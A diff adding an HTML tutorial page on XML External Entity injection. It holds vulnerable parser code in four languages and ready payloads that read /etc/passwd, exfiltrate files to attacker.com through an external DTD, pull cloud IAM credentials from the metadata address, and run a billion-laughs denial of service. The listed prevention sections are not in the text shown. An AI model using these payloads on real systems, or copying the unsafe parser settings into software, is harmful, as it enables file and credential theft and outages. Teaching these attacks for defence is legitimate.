@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE (XML External Entity) - Comprehensive Guide</title>
+    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">
+    <style>
+        .learn-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .back-nav:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .page-header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(13, 255, 146, 0.05));
+            border-radius: 12px;
+            margin-bottom: 50px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        
+        .page-header h1 {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .content-section {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
+        }
+        
+        .content-section:hover {
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.15);
+        }
+        
+        .content-section h2 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .content-section h2:before {
+            content: "▸";
+            color: var(--secondary-color);
+            font-size: 2.5rem;
+        }
+        
+        .content-section h3 {
+            color: var(--secondary-color);
+            font-size: 1.5rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        .content-section h4 {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 12px;
+        }
+        
+        .content-section p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .content-section ul, .content-section ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        
+        .content-section li {
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        
+        .content-section li strong {
+            color: var(--secondary-color);
+        }
+        
+        .content-section code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+        
+        .content-section pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        
+        .content-section pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+        
+        .content-section a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--secondary-color);
+            transition: all 0.3s;
+        }
+        
+        .content-section a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+        
+        .content-section strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+        
+        .toc {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .toc h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 10px;
+        }
+        
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+            padding-left: 15px;
+        }
+        
+        .toc a:before {
+            content: "→";
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="learn-container">
+        <a href="javascript:history.back()" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back to Attack Flows
+        </a>
+        
+        <div class="page-header">
+            <h1><i class="fas fa-file-code"></i> XXE (XML External Entity)</h1>
+            <p>Comprehensive Guide to Understanding, Exploiting, and Preventing XXE Injection Attacks</p>
+        </div>
+        
+        <div class="toc">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#section-0">What is XXE?</a></li>
+                <li><a href="#section-1">How XXE Works</a></li>
+                <li><a href="#section-2">Types of XXE Attacks</a></li>
+                <li><a href="#section-3">Advanced XXE Techniques</a></li>
+                <li><a href="#section-4">Bypass Methods</a></li>
+                <li><a href="#section-5">Prevention & Mitigation</a></li>
+                <li><a href="#section-6">Detection & Testing</a></li>
+                <li><a href="#section-7">Real-World Examples</a></li>
+                <li><a href="#section-8">Quick Reference</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-0">
+            <h2>What is XXE?</h2>
+            <p>XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows attackers to view files on the application server filesystem, interact with backend systems, and potentially perform Server-Side Request Forgery (SSRF) attacks.</p>
+            
+            <h3>Why is XXE Critical?</h3>
+            <p>XXE vulnerabilities are dangerous because they:</p>
+            <ul>
+                <li><strong>File Disclosure:</strong> Can read any file accessible to the application</li>
+                <li><strong>SSRF Capabilities:</strong> Can make requests to internal systems</li>
+                <li><strong>Denial of Service:</strong> Can crash servers with billion laughs attack</li>
+                <li><strong>Port Scanning:</strong> Can enumerate internal network services</li>
+                <li><strong>RCE Potential:</strong> May lead to remote code execution in some scenarios</li>
+                <li><strong>Data Exfiltration:</strong> Can extract sensitive data through DNS or HTTP</li>
+            </ul>
+            
+            <h3>Attack Capabilities</h3>
+            <p>Successful XXE exploitation allows attackers to:</p>
+            <ul>
+                <li>Retrieve files from the server filesystem</li>
+                <li>Read source code and configuration files</li>
+                <li>Access internal network resources</li>
+                <li>Perform port scanning on internal networks</li>
+                <li>Execute denial-of-service attacks</li>
+                <li>Exfiltrate data through out-of-band channels</li>
+                <li>Potentially achieve remote code execution</li>
+                <li>Bypass authentication mechanisms</li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-1">
+            <h2>How XXE Works</h2>
+            
+            <h3>Attack Flow</h3>
+            <p>XXE attacks typically follow this pattern:</p>
+            <ol>
+                <li><strong>XML Input Discovery:</strong> Identify endpoints accepting XML input</li>
+                <li><strong>DTD Testing:</strong> Test if DTD (Document Type Definition) processing is enabled</li>
+                <li><strong>Entity Injection:</strong> Inject malicious external entities</li>
+                <li><strong>Data Extraction:</strong> Retrieve data through in-band or out-of-band methods</li>
+                <li><strong>Exploitation:</strong> Escalate to SSRF, DoS, or RCE</li>
+            </ol>
+            
+            <h3>Understanding XML External Entities</h3>
+            <pre><code class="language-xml">&lt;!-- Basic XML Structure --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY entityName "entityValue"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;entityName;&lt;/data&gt;
+&lt;/root&gt;
+
+&lt;!-- External Entity Definition --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+
+            <h3>Vulnerable Code Examples</h3>
+            
+            <h4>PHP - Unsafe XML Parsing</h4>
+            <pre><code class="language-php">&lt;?php
+// VULNERABLE: libxml_disable_entity_loader(false) enables XXE
+libxml_disable_entity_loader(false);
+$xml = simplexml_load_string($_POST['xml']);
+echo $xml-&gt;data;
+
+// Attack payload:
+/*
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+*/
+?&gt;</code></pre>
+
+            <h4>Java - Unsafe DocumentBuilder</h4>
+            <pre><code class="language-java">// VULNERABLE: No protection against XXE
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
+
+// Attack allows file reading and SSRF</code></pre>
+
+            <h4>Python - Unsafe XML Parsing</h4>
+            <pre><code class="language-python">import xml.etree.ElementTree as ET
+
+# VULNERABLE: Default parser allows XXE
+def parse_xml(xml_string):
+    root = ET.fromstring(xml_string)
+    return root.find('data').text
+
+# Attack payload can read files</code></pre>
+
+            <h4>.NET - Unsafe XmlReader</h4>
+            <pre><code class="language-csharp">// VULNERABLE: DtdProcessing enabled
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Parse;
+XmlReader reader = XmlReader.Create(xmlStream, settings);
+
+// Allows XXE attacks</code></pre>
+        </div>
+        
+        <div class="content-section" id="section-2">
+            <h2>Types of XXE Attacks</h2>
+            
+            <h3>1. Classic XXE (In-Band)</h3>
+            <p>Direct retrieval of file contents in the application response.</p>
+            <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+
+&lt;!-- Reading PHP source code --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+
+            <h3>2. Blind XXE (Out-of-Band)</h3>
+            <p>Data exfiltration through DNS or HTTP when direct output is not possible.</p>
+            <pre><code class="language-xml">&lt;!-- DNS Exfiltration --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;
+
+&lt;!-- evil.dtd on attacker server --&gt;
+&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%all;</code></pre>
+
+            <h3>3. Error-Based XXE</h3>
+            <p>Extracting data through error messages.</p>
+            <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+
+&lt;!-- error.dtd --&gt;
+&lt;!ENTITY % all "&lt;!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%all;
+%error;</code></pre>
+
+            <h3>4. SSRF via XXE</h3>
+            <pre><code class="language-xml">&lt;!-- Internal port scanning --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:22"&gt;
+]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+&lt;!-- Cloud metadata access --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</code></pre>
+
+            <h3>5. Billion Laughs Attack (DoS)</h3>
+            <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
+  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
+  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
+  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
+  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
+  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
+        </div>
